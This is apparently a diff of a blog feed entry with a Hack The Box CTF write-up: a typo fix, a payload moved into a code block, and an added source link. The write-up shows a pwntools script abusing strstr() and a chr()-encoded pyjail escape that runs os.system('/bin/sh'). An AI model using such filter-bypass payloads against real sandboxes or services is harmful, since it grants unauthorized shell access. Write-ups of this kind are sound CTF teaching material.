@@ -10,6 +10,7 @@
 &lt;li>&lt;a href="#janken">Janken&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#nehebkaus-trap">nehebkaus trap&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#the-chasms-crossing-conundrum">The Chasm&amp;rsquo;s Crossing Conundrum&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#original-posts">Original Posts&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;/nav>
 &lt;/details>
@@ -200,7 +201,7 @@
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">%s[+] You won this round! Congrats!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[1;32m&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[1;36m&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We noticed that the program (Guru) chooses a random number from 0 to 2, which is rock, paper, scissors accordingly. It then checks if our input contains the string that can win against its choice using the &lt;a href="https://man7.org/linux/man-pages/man3/strstr.3.html" target="_blank" rel="noopener">strstr()&lt;/a> function.&lt;/p>
-&lt;p>In order words, if Guru chooses rock, then if our input contain the string &amp;ldquo;scissors&amp;rdquo;, we win.&lt;/p>
+&lt;p>In other words, if Guru chooses &lt;strong>rock&lt;/strong>, then if our input contain the string &lt;strong>paper&lt;/strong>, we win.&lt;/p>
 &lt;p>We can exploit the &lt;strong>strstr()&lt;/strong> by spamming &lt;strong>rockpaperscissors&lt;/strong> 100 times or write a script to do it for us.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
@@ -221,8 +222,9 @@
 &lt;p>A classic pyjail challenge with no source code. It filtered out some special characters like &lt;strong>&amp;rsquo;, &amp;ldquo;, _, ., /&lt;/strong> so we couldn&amp;rsquo;t directly execute any code.&lt;/p>
 &lt;p>One way to bypass this is to break down the string of code we want to execute into individual characters and concatenate them together using the &lt;em>+&lt;/em> operator.&lt;/p>
 &lt;p>We can bypass the &lt;strong>&amp;rsquo;&lt;/strong> and &lt;strong>&amp;rdquo;&lt;/strong> filter simply by using chr(hex-value-of-the-ascii-character) to make the character we want.&lt;/p>
-&lt;p>For this I used &lt;strong>eval(&amp;quot;_&lt;em>import&lt;/em>_(&amp;lsquo;os&amp;rsquo;).system(&amp;rsquo;/bin/sh&amp;rsquo;)&amp;quot;)&lt;/strong>. The payload for this is: &lt;strong>eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))&lt;/strong>&lt;/p>
-&lt;p>Now with all the pieces together, let&amp;rsquo;s send our exploit.&lt;/p>
+&lt;p>For this I used &lt;code>eval(&amp;quot;\__import__('os').system('/bin/sh')&amp;quot;)&lt;/code>. The payload for this is:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now with all the pieces together, let&amp;rsquo;s send our exploit.&lt;/p>
 &lt;img src="flag3.png" alt="FLAG" width="1000"/>
 &lt;p>Flag is: &lt;strong>HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}&lt;/strong>&lt;/p>
 &lt;h2 id="the-chasms-crossing-conundrum">The Chasm&amp;rsquo;s Crossing Conundrum&lt;/h2>
@@ -299,4 +301,8 @@
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">)&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="flag4.png" alt="Logic bug go brrr" width="1000"/>
-&lt;p>Flag is: &lt;strong>HTB{4cro55_th3_br1dg3_4nd_th3_ch4sm_l13s_th3_tr34sur3}&lt;/strong>&lt;/p></description></item></channel></rss>
+&lt;p>Flag is: &lt;strong>HTB{4cro55_th3_br1dg3_4nd_th3_ch4sm_l13s_th3_tr34sur3}&lt;/strong>&lt;/p>
+&lt;h2 id="original-posts">Original Posts&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://fazect.github.io/htb2023/" target="_blank" rel="noopener">From FazeCT&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
